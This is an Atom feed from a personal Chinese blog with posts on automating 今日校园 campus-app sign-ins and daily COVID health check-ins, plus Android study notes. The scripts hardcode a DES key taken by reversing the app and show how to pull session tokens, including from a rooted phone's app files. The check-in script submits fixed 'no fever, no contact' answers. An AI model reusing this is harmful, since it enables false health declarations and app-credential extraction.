class="line"><span class="string">:return: 成功True/失败False</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">url = <span class="string">'https://wfust.cpdaily.com/iap/doLogin'</span>  <span class="comment"># POST</span></span><br><span class="line">lt_url = <span class="string">'https://wfust.cpdaily.com/iap/login?service=https%3A%2F%2Fwfust.cpdaily.com%2Fportal%2Flogin'</span>  <span class="comment"># GET</span></span><br><span class="line">lt_compile = re.compile(<span class="string">r'id="lt" value="(.*?)"'</span>)</span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded; charset=UTF-8'</span>,</span><br><span class="line"><span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36'</span>, <span class="string">'X-Requested-With'</span>: <span class="string">'XMLHttpRequest'</span>, <span class="string">'Referer'</span>: <span class="string">'https://wfust.cpdaily.com/iap/login?service=https%3A%2F%2Fwfust.cpdaily.com%2Fportal%2Flogin'</span></span><br><span class="line">&#125;</span><br><span class="line">text = session.get(url=lt_url, verify=<span class="keyword">False</span>).text</span><br><span class="line">lt = lt_compile.findall(text)[<span class="number">0</span>]</span><br><span class="line">data = &#123;</span><br><span class="line"><span class="comment"># 此处配置你的账号</span></span><br><span class="line"><span class="string">'username'</span>: USERCODE,</span><br><span class="line"><span class="comment"># 此处配置你的密码</span></span><br><span class="line"><span class="string">'password'</span>: USERPWD,</span><br><span class="line"><span class="string">'lt'</span>: lt,</span><br><span class="line"><span class="string">'captcha'</span>: <span class="string">''</span>,</span><br><span class="line"><span class="string">'rememberMe'</span>: <span class="string">'false'</span></span><br><span class="line">&#125;</span><br><span class="line">res = session.post(url=url, headers=headers, data=data, verify=<span class="keyword">False</span>)</span><br><span class="line">re_url = res.json().get(<span class="string">'url'</span>)</span><br><span class="line"><span class="keyword">if</span> re_url <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">resp = session.post(url=re_url, headers=headers, data=data, verify=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">if</span> resp.status_code == <span class="number">200</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'cookie.ini'</span>, <span class="string">'r'</span>, encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">read = f.read()</span><br><span class="line"><span class="keyword">if</span> read != <span class="string">''</span>:</span><br><span class="line">session.cookies[<span class="string">'MOD_AUTH_CAS'</span>] = read</span><br><span class="line">text = startSign()</span><br><span class="line">session.get(</span><br><span class="line"><span class="string">'https://sc.ftqq.com/**********你server酱的SCKEY**********.send?text=今日校园签到&amp;desp='</span> + text)</span><br></pre></td></tr></table></figure><h1 id="在云函数中部署"><a href="#在云函数中部署" class="headerlink" title="在云函数中部署"></a>在云函数中部署</h1><p>具体步骤参考上一篇文章：<a href="https://blog.suqir.xyz/2020/03/22/Python-%E4%BA%91%E5%87%BD%E6%95%B0%E5%AE%9E%E7%8E%B0%E4%BB%8A%E6%97%A5%E6%A0%A1%E5%9B%AD%E6%AF%8F%E6%97%A5%E8%87%AA%E8%AF%8A%E6%89%93%E5%8D%A1/#more">Python+云函数实现今日校园每日自诊打卡</a></p><p>需要注意的是，你需要在云函数里安装依赖包，当然直接把依赖包打包上传也可以。除此之外，你还可以在服务器里面部署定时任务</p><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>关于上一篇文章挖的几个坑，<del>我还没有填完，待我时间充裕或者我真的需要的时候再填吧！</del><strong>2020.03.31更新：已填完所有坑</strong></p><p>国内疫情已经基本稳定，估计开学那天已经快来了！</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文将探讨如何对今日校园发起的签到进行定时回应，即自动签到，同时了解使用Python进行阿里云oss的文件上传、Python的DES加解密库、逆向分析Android应用获取关键信息（本文涉及DES加解密的密钥和IV向量的获取）等&lt;/p&gt;
    
    </summary>
    
    
      <category term="Python" scheme="https://blog.suqir.xyz/categories/Python/"/>
    
    
  </entry>
  
  <entry>
    <title>Python+云函数实现今日校园每日自诊打卡</title>
    <link href="https://blog.suqir.xyz/2020/03/22/Python-%E4%BA%91%E5%87%BD%E6%95%B0%E5%AE%9E%E7%8E%B0%E4%BB%8A%E6%97%A5%E6%A0%A1%E5%9B%AD%E6%AF%8F%E6%97%A5%E8%87%AA%E8%AF%8A%E6%89%93%E5%8D%A1/"/>
    <id>https://blog.suqir.xyz/2020/03/22/Python-%E4%BA%91%E5%87%BD%E6%95%B0%E5%AE%9E%E7%8E%B0%E4%BB%8A%E6%97%A5%E6%A0%A1%E5%9B%AD%E6%AF%8F%E6%97%A5%E8%87%AA%E8%AF%8A%E6%89%93%E5%8D%A1/</id>
    <published>2020-03-22T14:23:03.000Z</published>
    <updated>2020-03-31T15:33:50.393Z</updated>
    
    <content type="html"><![CDATA[<p>科技改变生活，懒人重塑世界，这是一段可以让你早睡早起的健康绿色python代码</p><a id="more"></a><h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>相信你也和我一样，每日在今日校园这个爱啪啪里准时进行自诊打卡。但是有时候难免会出现忘记打卡的情况，所以这个程序就诞生了</p><h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><ol><li>你需要有你的<code>Cookie</code>(下文会说明)</li><li>你需要有阿里云或者腾讯云等提供云函数服务的服务商的账号</li><li>如果你需要微信实时通知打卡的情况，那么你必须有一个<a href="http://sc.ftqq.com/3.version" target="_blank" rel="noopener">Server酱</a>的SCKEY</li></ol><h1 id="获取Cookie"><a href="#获取Cookie" class="headerlink" title="获取Cookie"></a>获取Cookie</h1><p>那么程序怎么知道是你在打卡而不是郭涛在打卡呢？</p><p>是的，服务器需要<code>Cookie</code>进行识别你的身份，就像我们每个人的身份证号码都不相同，我们的<code>Cookie</code>也是不同的。当然，我们并不是需要用到所有的<code>Cookie</code>，仅仅需要用到其中的<code>sessionToken</code>就能使用了。下面介绍获取Cookie的三种方法</p><h2 id="方法一-抓包获取"><a href="#方法一-抓包获取" class="headerlink" title="方法一 抓包获取"></a>方法一 抓包获取</h2><p>使用抓包软件即可获取登录的Cookie</p><h2 id="方法二-通过脚本"><a href="#方法二-通过脚本" class="headerlink" title="方法二 通过脚本"></a>方法二 通过脚本</h2><p>运行以下代码获得<code>sessionToken</code>数据，但是会挤掉你在手机上的登录：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64, json, requests, re</span><br><span class="line"><span class="keyword">from</span> pyDes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">KEY = <span class="string">"ST83=@XV"</span></span><br><span class="line">IV = <span class="string">b"\x01\x02\x03\x04\x05\x06\x07\x08"</span></span><br><span class="line">session = requests.session()</span><br><span class="line">session.headers = &#123;</span><br><span class="line"><span class="string">'Content-Type'</span>: <span class="string">'application/json; charset=UTF-8'</span>,</span><br><span class="line"><span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Linux; Android 8.1.0; 16th Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.110 Mobile Safari/537.36 okhttp/3.12.4'</span>,</span><br><span class="line"><span class="string">'CpdailyInfo'</span>: <span class="string">'XvWN4SWqyX648L13hW5koOHt5AfBN6jFTi4zR23WludYuPZfzB8fDcBpRB80 G2iWtG0fERtQ4X9JeLE+FgLD12tqKe6S+8Si5eM2MJ84epV/uHWh0tWeuEIz KKrLHH1I3GWM8/lhSRjQE4DL/m2G++NY/Bf8QiB3IFf0NmdzdWBFBoh4+Qs1 wDIwt38Qm/8smWF4JVDCrFay2Cz7K1F2IX90L9RCuoQO'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># des加密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(s)</span>:</span></span><br><span class="line">    k = des(KEY, CBC, IV, pad=<span class="keyword">None</span>, padmode=PAD_PKCS5)</span><br><span class="line">    EncryptStr = k.encrypt(s)</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(EncryptStr).decode()  <span class="comment"># 转base64编码返回</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendValidCode</span><span class="params">(cell)</span>:</span></span><br><span class="line">mobile = encrypt(cell)</span><br><span class="line">url = <span class="string">'https://mobile.campushoy.com/v6/auth/authentication/mobile/messageCode'</span> <span class="comment"># POST</span></span><br><span class="line">data = json.dumps(&#123;</span><br><span class="line"><span class="string">'mobile'</span>: mobile</span><br><span class="line">&#125;)</span><br><span class="line">res = session.post(url=url, data=data, verify=<span class="keyword">False</span>).json()</span><br><span class="line">print(res)</span><br><span class="line"><span class="keyword">if</span> res.get(<span class="string">'errCode'</span>) == <span class="number">2011</span>:</span><br><span class="line">print(res.get(<span class="string">'errMsg'</span>))</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span></span><br><span class="line"><span class="keyword">elif</span> res.get(<span class="string">'errCode'</span>) == <span class="number">0</span>:</span><br><span class="line">print(<span class="string">'验证码发送成功！请查收...'</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loginByPhone</span><span class="params">(cell, code)</span>:</span></span><br><span class="line">url = <span class="string">'https://mobile.campushoy.com/v6/auth/authentication/mobileLogin'</span> <span class="comment"># POST</span></span><br><span class="line">data = json.dumps(&#123;</span><br><span class="line"><span class="string">'loginId'</span>: cell,</span><br><span class="line"><span class="string">'loginToken'</span>: code</span><br><span class="line">&#125;)</span><br><span class="line">res = session.post(url=url, data=data, verify=<span class="keyword">False</span>)</span><br><span class="line">jdata = res.json().get(<span class="string">'data'</span>)</span><br><span class="line">personId = jdata.get(<span class="string">'personId'</span>, <span class="string">''</span>)</span><br><span class="line">userId = jdata.get(<span class="string">'userId'</span>, <span class="string">''</span>)</span><br><span class="line"><span class="comment"># 学号</span></span><br><span class="line">openId = jdata.get(<span class="string">'openId'</span>, <span class="string">''</span>)</span><br><span class="line"><span class="comment"># 姓名</span></span><br><span class="line">name = jdata.get(<span class="string">'name'</span>, <span class="string">''</span>)</span><br><span class="line">tenantId = jdata.get(<span class="string">'tenantId'</span>, <span class="string">''</span>)</span><br><span class="line">tgc = jdata.get(<span class="string">'tgc'</span>, <span class="string">''</span>)</span><br><span class="line"><span class="comment"># 主要Cookie参数</span></span><br><span class="line">sessionToken = jdata.get(<span class="string">'sessionToken'</span>, <span class="string">''</span>)</span><br><span class="line">print(<span class="string">"你的token："</span>)</span><br><span class="line">print(<span class="string">"sessionToken: %s"</span> % sessionToken)</span><br><span class="line">print(<span class="string">"请将以上token内容填入Cookie！"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">"__main__"</span>:</span><br><span class="line">cell = input(<span class="string">"==&gt;请输入手机号: "</span>)</span><br><span class="line"><span class="keyword">if</span> sendValidCode(cell) != <span class="number">2</span>:</span><br><span class="line">code = input(<span class="string">"==&gt;请输入验证码: "</span>)</span><br><span class="line">loginByPhone(cell, code)</span><br></pre></td></tr></table></figure><h2 id="方法三-通过配置文件（推荐）"><a href="#方法三-通过配置文件（推荐）" class="headerlink" title="方法三 通过配置文件（推荐）"></a>方法三 通过配置文件（推荐）</h2><p>使用这个方法是你的手机必须已经Root</p><p>找到文件<code>/data/user/0/com.wisedu.cpdaily/shared_prefs/preference_configs.xml</code>打开，找到里面的<code>sessionToken</code>项，它的值即为Cookie中必须的<code>sessionToken</code></p><h1 id="Python脚本"><a href="#Python脚本" class="headerlink" title="Python脚本"></a>Python脚本</h1><p>自行替换脚本中的<code>Cookie</code>：</p><p><img src="/2020/03/22/Python-云函数实现今日校园每日自诊打卡/cookie.png" alt="cookie" style="zoom:50%;"></p><p>如果你想要实现微信通知打卡执行的状态，请在<code>requests.get(&#39;https://sc.ftqq.com/你server酱的SCKEY.send?text=今日校园自诊打卡&amp;desp=&#39;+msg, verify=False)</code>里相应位置填写你的SCKEY</p><p>如果不需要或者完全不知道怎样弄，那么你完全可以大胆的删除这一行代码，而程序不会出现任何逻辑上的问题</p><p>对于需要上传的数据，它们分别为：</p><p><code>fever</code>：是否有呼吸道感染症状，如：1（无）</p><p><code>contact</code>：是否与敏感/疑似/确诊人员接触过，如：0（否）</p><p><code>province</code>：你所在的省份，如：四川省</p><p><code>city</code>：你所在的城市，如：南充市</p><p><code>prefecture</code>：你所在的县市区，如：仪陇县</p><p>请确保以上数据和你以前打卡的数据一致</p><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests, json</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line"><span class="comment"># 打卡</span></span><br><span class="line">url = <span class="string">'https://mobile.campushoy.com/v6/epidemic/putEpidemicInfo'</span> <span class="comment"># POST OPTION</span></span><br><span class="line"><span class="comment"># 获取打卡详情</span></span><br><span class="line">get_detail_url =<span class="string">'https://mobile.campushoy.com/v6/epidemic/getEpidemicInfo'</span> <span class="comment"># GET</span></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">'Content-Type'</span>: <span class="string">'application/json;charset=UTF-8'</span>,</span><br><span class="line"><span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Linux; Android 8.1.0; 16th Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.110 Mobile Safari/537.36 yiban/8.1.7 cpdaily/8.1.7 wisedu/8.1.7'</span>,</span><br><span class="line"><span class="string">'Cookie'</span>: <span class="string">'sessionToken=此处填写你的sessionToken'</span></span><br><span class="line">&#125;</span><br><span class="line">session.headers.update(headers)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">daka</span><span class="params">()</span>:</span></span><br><span class="line">data = json.dumps(&#123;</span><br><span class="line"><span class="string">'fever'</span>: <span class="string">'1'</span>, <span class="comment"># 是否有呼吸道感染症状：1无；</span></span><br><span class="line"><span class="string">'contact'</span>: <span class="string">'0'</span>, <span class="comment"># 是否与敏感/疑似/确诊人员接触过：0否；</span></span><br><span class="line"><span class="string">'province'</span>: <span class="string">'四川省'</span>, <span class="comment"># 你所在的省份</span></span><br><span class="line"><span class="string">'city'</span>: <span class="string">'南充市'</span>, <span class="comment"># 你所在的城市</span></span><br><span class="line"><span class="string">'prefecture'</span>: <span class="string">'仪陇县'</span> <span class="comment"># 你所在的县市区</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">res = session.post(url=url, data = data, verify=<span class="keyword">False</span>)</span><br><span class="line">status = res.json().get(<span class="string">'errMsg'</span>)</span><br><span class="line"><span class="keyword">return</span> status</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getEpidemicInfo</span><span class="params">()</span>:</span></span><br><span class="line">res = session.get(url=get_detail_url, verify=<span class="keyword">False</span>)</span><br><span class="line">info = res.json().get(<span class="string">'data'</span>, <span class="string">''</span>)</span><br><span class="line"><span class="comment"># print(info)</span></span><br><span class="line">msg = res.json().get(<span class="string">'errMsg'</span>, <span class="string">'failed'</span>)</span><br><span class="line">updateTime = info.get(<span class="string">'updateTime'</span>, <span class="string">''</span>)</span><br><span class="line"><span class="keyword">return</span> updateTime</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">()</span>:</span></span><br><span class="line">status = daka()</span><br><span class="line">time = getEpidemicInfo()</span><br><span class="line">msg = status + <span class="string">'(打卡时间：'</span> + time + <span class="string">')'</span></span><br><span class="line">print(msg)</span><br><span class="line">requests.get(<span class="string">'https://sc.ftqq.com/你server酱的SCKEY.send?text=今日校园自诊打卡&amp;desp='</span>+msg, verify=<span class="keyword">False</span>)</span><br></pre></td></tr></table></figure><h1 id="云函数的设置"><a href="#云函数的设置" class="headerlink" title="云函数的设置"></a>云函数的设置</h1><p>这里以阿里云的函数计算为例，其他服务商应该操作类似</p><ol><li><p>打开阿里云的函数计算，找到<strong>服务-函数</strong>，选择新建函数</p><p><img src="/2020/03/22/Python-云函数实现今日校园每日自诊打卡/daka云函数1.png" alt="daka云函数1"></p></li><li><p>设置函数名称，运行环境（必须选择python3），函数入口和运行内存</p><p><img src="/2020/03/22/Python-云函数实现今日校园每日自诊打卡/daka云函数2.png" alt="daka云函数2"></p></li><li><p>编辑代码</p><p><img src="/2020/03/22/Python-云函数实现今日校园每日自诊打卡/daka云函数3.png" alt="daka云函数3"></p></li><li><p>创建触发器</p><p><img src="/2020/03/22/Python-云函数实现今日校园每日自诊打卡/daka云函数4.png" alt="daka云函数4"></p></li><li><p>设置触发器</p><p><img src="/2020/03/22/Python-云函数实现今日校园每日自诊打卡/daka云函数5.png" alt="daka云函数5"></p></li></ol><h1 id="完成效果"><a href="#完成效果" class="headerlink" title="完成效果"></a>完成效果</h1><p>当你一切都准备好了以后，你只需要每天关注是否有打卡失败的消息发送给你，每当出现这种情况，一般都是<code>Cookie</code>已经失效了，你需要去云函数里更新你的<code>Cookie</code>设置</p><p><img src="/2020/03/22/Python-云函数实现今日校园每日自诊打卡/vx1.jpg" alt="vx1" style="zoom:50%;"></p><p><img src="/2020/03/22/Python-云函数实现今日校园每日自诊打卡/vx2.jpg" alt="vx1" style="zoom:50%;"></p><p>最后，好好享受属于你的早晨吧！</p><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>相信你也感觉到了使用起来并不简单，还需要自己抓<code>Cookie</code>这种操作。不过不用担心，强迫症使我不会允许这种问题一直存在，<del>目前登录功能和签到功能正在开发中，相信不久就能和大家见面了！</del>更新完成，不用抓包了</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;科技改变生活，懒人重塑世界，这是一段可以让你早睡早起的健康绿色python代码&lt;/p&gt;
    
    </summary>
    
    
      <category term="Python" scheme="https://blog.suqir.xyz/categories/Python/"/>
    
    
  </entry>
  
  <entry>
    <title>Android编程权威指南学习笔记一</title>
    <link href="https://blog.suqir.xyz/2020/03/18/Android%E7%BC%96%E7%A8%8B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/"/>
    <id>https://blog.suqir.xyz/2020/03/18/Android%E7%BC%96%E7%A8%8B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/</id>
    <published>2020-03-18T08:02:28.000Z</published>
    <updated>2020-03-30T11:34:43.795Z</updated>
    
    <content type="html"><![CDATA[<p>最近准备学习安卓开发，选择学习书籍的时候，在《第一行代码》第2版和《Android编程权威指南》第3版之间选择了后者，这篇文章将记录下学习过程中的重点和我学习中遇到的问题</p><a id="more"></a><h1 id="第一章-Android开发初体验"><a href="#第一章-Android开发初体验" class="headerlink" title="第一章 Android开发初体验"></a>第一章 Android开发初体验</h1><h2 id="定制Toast"><a href="#定制Toast" class="headerlink" title="定制Toast"></a>定制Toast</h2><p>使用<strong><code>Toast</code></strong>类的<strong><code>setGravity</code></strong>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Toast.makeText(MainActivity.<span class="keyword">this</span>,R.string.incorrect_toast,Toast.LENGTH_SHORT);</span><br><span class="line">toast.setGravity(Gravity.TOP,<span class="number">0</span>,<span class="number">50</span>);</span><br><span class="line">toast.show();</span><br></pre></td></tr></table></figure><h1 id="第二章-MVC设计模式"><a href="#第二章-MVC设计模式" class="headerlink" title="第二章 MVC设计模式"></a>第二章 MVC设计模式</h1><h2 id="配置Android-Studio识别成员变量的m前缀"><a href="#配置Android-Studio识别成员变量的m前缀" class="headerlink" title="配置Android Studio识别成员变量的m前缀"></a>配置Android Studio识别成员变量的m前缀</h2><blockquote><p>File → Settings → Editor→ Code Style→ Code Generation  </p></blockquote><ol><li><p>在Naming表单的Field一行中，添加m作为前缀 ;</p></li><li><p>添加s作为Static field的前缀</p></li></ol><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>需要Android Studio为<code>mText</code>生成get方法时，它生成的是<code>getText()</code>而不是<code>getMText()</code></p><h2 id="模型、视图、控制器"><a href="#模型、视图、控制器" class="headerlink" title="模型、视图、控制器"></a>模型、视图、控制器</h2><p><img src="/2020/03/18/Android编程权威指南学习笔记一/1.png" alt="1"></p><h3 id="模型对象"><a href="#模型对象" class="headerlink" title="模型对象"></a>模型对象</h3><p>模型对象存储着应用的数据和业务逻辑</p><ol><li>模型对象不关心用户界面，它为存储和管理应用数据而生</li><li>模型类通常就是我们创建的定制类</li><li>应用的全部模型对象组成了模型层</li></ol><h3 id="视图对象"><a href="#视图对象" class="headerlink" title="视图对象"></a>视图对象</h3><p>视图对象知道如何在屏幕上绘制自己，以及如何响应用户的输入</p><ol><li>凡是能够在屏幕上看见的对象，就是视图对象</li><li>自带很多视图类</li><li>可自己定制开发其他视图类</li><li>应用的全部视图对象组成了视图层</li></ol><h3 id="控制器对象"><a href="#控制器对象" class="headerlink" title="控制器对象"></a>控制器对象</h3><p>控制器对象含有应用的逻辑单元，是视图对象与模型对象的联系纽带</p><ul><li>控制器通常是<code>Activity</code>、 <code>Fragment</code>或<code>Service</code>的子类</li></ul><h2 id="MVC设计模式的优点"><a href="#MVC设计模式的优点" class="headerlink" title="MVC设计模式的优点"></a>MVC设计模式的优点</h2><ol><li>可以按类而不是按变量和方法思考设计开发问题</li><li>可以按层而非一个个类来考虑设计开发</li><li>便于复用类</li></ol><h2 id="ImageView"><a href="#ImageView" class="headerlink" title="ImageView"></a><code>ImageView</code></h2><h3 id="android-contentDescription属性"><a href="#android-contentDescription属性" class="headerlink" title="android:contentDescription属性"></a><code>android:contentDescription</code>属性</h3><ol><li>该属性能为视力障碍用户提供方便</li><li>设置文字属性值后，如果设备的可访问性选项作了相应设置，那么在用户点击图形按钮时，设备便会读出属性值的内容</li></ol><h1 id="第三章-Activity的生命周期"><a href="#第三章-Activity的生命周期" class="headerlink" title="第三章 Activity的生命周期"></a>第三章 Activity的生命周期</h1><p>每个Activity实例都有其生命周期。在其生命周期内， activity在运行、暂停、停止和不存在这四种状态间转换</p><p><img src="/2020/03/18/Android编程权威指南学习笔记一/2.png" alt="2"></p><h2 id="覆盖onCreate-Bundle-方法可以完成的工作"><a href="#覆盖onCreate-Bundle-方法可以完成的工作" class="headerlink" title="覆盖onCreate(Bundle)方法可以完成的工作"></a>覆盖<code>onCreate(Bundle)</code>方法可以完成的工作</h2><p>切记，千万不要自己去调用<code>onCreate(Bundle)</code>方法或任何其他activity生命周期方法  </p><ol><li>实例化组件并将它们放置在屏幕上（调用<code>setContentView(int)</code>方法）</li><li>引用已实例化的组件</li><li>为组件设置监听器以处理用户交互</li><li>访问外部模型数据</li></ol><h2 id="使用-Override注解"><a href="#使用-Override注解" class="headerlink" title="使用@Override注解"></a>使用@Override注解</h2><p>就是要求编译器保证当前类拥有你要覆盖的方法，而不会出现因拼写错误等而出现奇怪的问题</p><h2 id="部分手机Log日志不输出"><a href="#部分手机Log日志不输出" class="headerlink" title="部分手机Log日志不输出"></a>部分手机Log日志不输出</h2><p>国内的部分厂商定制的手机对于应用中的 Log 日志默认做了打印限制，需要手动设置才能打印出特殊级别的日志</p><h3 id="魅族"><a href="#魅族" class="headerlink" title="魅族"></a>魅族</h3><p>打开【设置】中的【开发者选项】，页面底部找到【性能优化】，打开【高级日志输出】，勾选【全部允许】</p><h3 id="华为"><a href="#华为" class="headerlink" title="华为"></a>华为</h3><p>打开拨号界面的拨号盘，输入<em>#</em>#2846579#<em>#</em>，系统会自动打开【工程菜单】界面，依次打开【后台设置】 -&gt; 【LOG设置】，勾选【AP日志】即可</p><h2 id="设备旋转屏幕时"><a href="#设备旋转屏幕时" class="headerlink" title="设备旋转屏幕时"></a>设备旋转屏幕时</h2><p>设备旋转时，系统会销毁当前Activity实例，创建一个新的Activity实例</p><ol><li>改变设备配置（ device configuration）</li><li>新建landscape资源</li></ol><h2 id="Bundle对象"><a href="#Bundle对象" class="headerlink" title="Bundle对象"></a>Bundle对象</h2><p>Bundle是存储字符串键与限定类型值之间映射关系（键值对）的一种结构</p><ol><li>只能是基本类型</li><li>可以实现Serializable或Parcelable接口的对象</li></ol><h1 id="第四章-Android应用的调试"><a href="#第四章-Android应用的调试" class="headerlink" title="第四章 Android应用的调试"></a>第四章 Android应用的调试</h1><h2 id="异常与栈跟踪"><a href="#异常与栈跟踪" class="headerlink" title="异常与栈跟踪"></a>异常与栈跟踪</h2><ol><li><p>直接查看崩溃日志</p></li><li><p>记录栈跟踪日志</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Log.d(TAG, MSG,<span class="keyword">new</span> Exception());</span><br></pre></td></tr></table></figure><ol start="3"><li><p>设置断点</p></li><li><p>使用异常断点</p><p>① 打开Run - View Breakpoints  或者使用快捷键c+s+f8</p><p>② 单击新增断点按钮（＋）设置一个新断点</p><p>③ 选择下拉列表中的Java Exception Breakpoints选项</p><p>④ 输 入 RuntimeException并选择RuntimeException是NullPointerException、 ClassCastException及其他常见异常的超类，因此该设置基本适用于所有异常</p><p>⑤ 点击Done按钮完成设置</p><p>⑥ 调试应用</p></li></ol><h2 id="Android特有的调试工具"><a href="#Android特有的调试工具" class="headerlink" title="Android特有的调试工具"></a>Android特有的调试工具</h2><h3 id="Android-Lint"><a href="#Android-Lint" class="headerlink" title="Android Lint"></a>Android Lint</h3><p>选择Analyze → Inspect Code…</p><h3 id="R类"><a href="#R类" class="headerlink" title="R类"></a>R类</h3><p>经常清理：Build → Clean Project</p><h1 id="第五章-第二个activity"><a href="#第五章-第二个activity" class="headerlink" title="第五章 第二个activity"></a>第五章 第二个activity</h1><h2 id="xml文件"><a href="#xml文件" class="headerlink" title="xml文件"></a>xml文件</h2><p><code>tools:text</code>属性的命名空间会在预览时显示文字内容，而在运行时不会显示</p><h2 id="c-s-n以快速打开某一文件"><a href="#c-s-n以快速打开某一文件" class="headerlink" title="c+s+n以快速打开某一文件"></a>c+s+n以快速打开某一文件</h2><h2 id="AndroidManifes-xml"><a 